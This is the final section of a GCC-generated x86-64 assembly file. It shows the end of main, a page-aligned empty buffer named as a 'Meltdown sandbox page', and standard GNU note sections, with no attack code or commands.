	call	__stack_chk_fail@PLT
.L48:
	movq	-8(%rbp), %rbx
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
	.section	.bss
	.p2align	12
__gg_meltdown_sandbox:
## Meltdown sandbox page (auto-generated)
	.skip	4096
	.text
.LFE14:
	.size	main, .-main
	.ident	"GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:

